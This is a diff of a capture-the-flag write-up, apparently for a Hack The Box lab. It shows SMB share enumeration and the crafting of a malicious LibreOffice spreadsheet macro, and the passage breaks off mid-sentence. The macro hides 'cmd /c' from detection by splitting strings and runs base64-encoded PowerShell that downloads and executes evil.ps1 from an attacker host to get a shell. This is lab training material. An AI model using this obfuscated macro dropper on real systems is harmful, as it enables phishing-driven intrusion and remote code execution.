@@ -128,6 +128,7 @@ rule metasploit
 
 - Checking out the SMB shares:
 
+---
 
 ### TCP PORT 445(SMB)
 
@@ -148,6 +149,103 @@ rule metasploit
         dr--r--r--                0 Fri Feb 14 04:12:30 2020    ..
         malware_dropbox                                         READ ONLY
 ```
-- I don't know why my __smbmap__ is misbehaving even after updating to the current version. It says the malware_dropbox is read only and yet I can write files to it.
+- I don't know why my __smbmap__ is misbehaving even after updating to the current version. It says the malware_dropbox is read only and yet I can write files to it. [Ippsec](https://www.youtube.com/watch?v=YXAakamjO_I&t=90s) does a good job debugging it here.
 
-- That aside, lets have some fun with smbmap
+---
+
+### EXPLOITATION
+
+- Lets check out our interesting page *ods Phishing Attempts* . Did a little research on *ods* which stands for open document spreadsheet that's like the open source version of excel.
+
+_ Lets install libreoffice
+
+```
+apt install libreoffice
+```
+- Lets create an ods file. Open calc spreadsheet. Go to tools and near bottom macros then organize macros then basic
+
+- Creating a basic command to test this out before weaponizing it.
+
+![Code execution](./screenshots/2_RE/code_execution.png)
+
+- And we have code execution. Now lets make it a little more complicated.
+
+ - I added cmd /c which is a common flag for running malware and a lot of things will detect that.
+
+ - We dont get a ping back hence we have to obfuscate it a little.
+
+- All we did was break up the variables so if there is something looking for cmd in macros it wont find it.
+
+- Testing this out
+
+- Lets try powershell
+
+```console
+REM  *****  BASIC  *****
+
+Sub Main
+	Pleasecheck = "cm"
+	Myweb = "d /c"
+	Site = "powershell ping -n 1 10.10.15.61"
+	Shell(Pleasecheck + Myweb + Site)
+End Sub
+```
+- And we still get a call back
+
+- Now lets do PowerShell encoded commands. PowerShell expects it in utf-16le.
+
+- Add the *base64* to our scripts
+
+```console
+
+REM  *****  BASIC  *****
+
+Sub Main
+	Pleasecheck = "cm"
+	Myweb = "d /c"
+	Site = "powershell -encordedcommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADUALgA2ADEACgA="
+	Shell(Pleasecheck + Myweb + Site)
+End Sub
+```
+- And we dont seem to get a call back. Lets do further obfuscation.
+
+```console
+REM  *****  BASIC  *****
+
+Sub Main
+	Pleasecheck = "cm"
+	Myweb = "d /c"
+	Site = "powersh"
+	onGit = "ell -encoded"
+	Hub = "command cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADUALgA2ADEACgA="
+	Shell(Pleasecheck + Myweb + Site + onGit + Hub)
+End Sub
+```
+- And we get a call back. Awesome!! Now we have a way of doing PowerShell encoded commands.
+
+---
+### GENERATE USER SHELL
+
+- Lets get the initial foothold
+
+```console
+~/CTF/HTB# echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.61/evil.ps1')" | iconv -t utf-16le | base64 -w 0
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANQAuADYAMQAvAGUAdgBpAGwALgBwAHMAMQAnACkACgA=
+```
+
+```
+REM  *****  BASIC  *****
+
+Sub Main
+	Pleasecheck = "cm"
+	Myweb = "d /c"
+	Site = "powersh"
+	onGit = "ell -encoded"
+	Hub = "command SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANQAuADYAMQAvAGUAdgBpAGwALgBwAHMAMQAnACkACgA="
+	Shell(Pleasecheck + Myweb + Site + onGit + Hub)
+End Sub
+
+```
+- And we get a shell as Luke
+
+- We get our first
